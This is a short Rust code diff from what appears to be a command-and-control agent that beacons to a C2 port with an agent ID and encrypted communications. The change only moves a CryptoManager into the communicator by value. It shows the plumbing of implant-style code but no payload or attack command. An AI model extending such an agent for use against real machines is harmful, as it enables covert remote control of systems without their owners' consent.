@@ -52,7 +52,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Run main agent loop
     info!("🚀 Starting main agent loop...");
-    match run_agent(&config, &crypto, &sys_info).await {
+    match run_agent(&config, crypto, &sys_info).await {
         Ok(_) => {
             info!("Agent loop completed gracefully");
         }
@@ -67,7 +67,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
 async fn run_agent(
     config: &Config,
-    crypto: &CryptoManager,
+    crypto: CryptoManager,
     sys_info: &SystemInfo,
 ) -> Result<(), Box<dyn std::error::Error>> {
     let mut communicator = communicator::Communicator::new(
@@ -75,6 +75,7 @@ async fn run_agent(
         config.c2_port,
         &sys_info.agent_id,
         config.beacon_interval,
+        crypto,
     );
 
     let mut reconnect_count = 0;
